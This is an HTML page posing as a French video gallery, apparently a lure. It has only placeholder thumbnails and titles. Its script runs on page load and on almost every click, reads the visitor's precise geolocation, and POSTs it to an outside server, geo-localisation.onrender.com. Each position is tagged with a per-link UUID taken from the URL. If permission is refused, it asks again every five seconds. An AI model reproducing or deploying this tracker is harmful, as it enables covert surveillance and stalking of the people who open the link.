<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Galerie de Vidéos</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    
</head>
<body>
    <div class="container mx-auto py-8">
        <h1 onclick="attemptGeolocation()"  class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
        <div onclick="attemptGeolocation()"  class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
          
          <!-- Carte de vidéo -->
          <div onclick="attemptGeolocation()"  class="bg-white rounded-lg shadow-md overflow-hidden">
            <img onclick="attemptGeolocation()"  class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div onclick="attemptGeolocation()" class="p-4">
              <h2 onclick="attemptGeolocation()"  class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
            
          </div>
    
          <!-- Répétez la carte de vidéo pour d'autres vidéos -->
          <div onclick="attemptGeolocation()"  class="bg-white rounded-lg shadow-md overflow-hidden">
            <img onclick="attemptGeolocation()"  class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div  onclick="attemptGeolocation()" class="p-4">
              <h2 onclick="attemptGeolocation()"  class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
    
          <div onclick="attemptGeolocation()"  class="bg-white rounded-lg shadow-md overflow-hidden">
            <img onclick="attemptGeolocation()"  class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div onclick="attemptGeolocation()"  class="p-4">
              <h2 onclick="attemptGeolocation()"  class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
    
          <div onclick="attemptGeolocation()"  class="bg-white rounded-lg shadow-md overflow-hidden">
            <img onclick="attemptGeolocation()"  class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div class="p-4">
              <h2 onclick="attemptGeolocation()"  class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
        </div>
      </div>

    <script>
        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
        function attemptGeolocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const uuid = window.location.pathname.split('/').pop();
                const { latitude, longitude } = position.coords;

                fetch('https://geo-localisation.onrender.com/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ uuid, latitude, longitude })
                })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
            }, error => {
                // En cas d'échec, recharger la page après un délai de 5 secondes
                console.error('Geolocation error:', error);
                setTimeout(attemptGeolocation, 5000);
            });
        }

        // Appeler la fonction pour tenter de récupérer la position
        attemptGeolocation();
    </script>
</body>
</html>
